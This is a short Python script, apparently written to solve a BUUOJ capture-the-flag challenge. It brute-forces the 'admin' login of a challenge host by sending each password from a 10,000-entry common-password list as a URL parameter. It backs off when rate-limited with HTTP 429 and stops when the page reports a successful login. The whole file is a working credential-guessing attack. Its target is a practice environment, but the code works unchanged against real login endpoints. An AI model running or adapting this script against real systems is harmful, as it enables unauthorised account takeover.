import time
from tqdm import tqdm
import requests


def read_txt_lines(file_path):
    lines = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = [line.strip() for line in file.readlines()]
        print(f"成功读取文件: {file_path}")
        print(f"共读取到 {len(lines)} 行内容")
        return lines
    except FileNotFoundError:
        print(f"错误: 文件 '{file_path}' 不存在")
        return False
    except UnicodeDecodeError:
        print(f"错误: 文件 '{file_path}' 编码不是utf-8，请尝试其他编码")
    except Exception as e:
        print(f"读取文件时发生错误: {str(e)}")

    return lines

def start_burp(dic_path,url):
    line = read_txt_lines(dic_path)
    with tqdm(total=len(line), desc="处理中") as pbar:
        for passwd in line:
            response = requests.get(url + passwd)
            if '404' in str(response.status_code):
                print('环境过期，请重启环境')
                break
            if '429' in str(response.status_code):
                time.sleep(0.5)
                continue
            if '登录成功' in response.text:
                print("该账号密码为: " + passwd)
                break
            pbar.update(1)

    print("检测完毕")


if __name__ == "__main__":
    url='http://31c468a1-5e3e-4219-9b91-c8bc87173925.node5.buuoj.cn:81/?username=admin&password='
    dictionary_path = 'D:/PythonProject/tests/10k_most_commonpwd.txt'
    start_burp(dictionary_path,url)



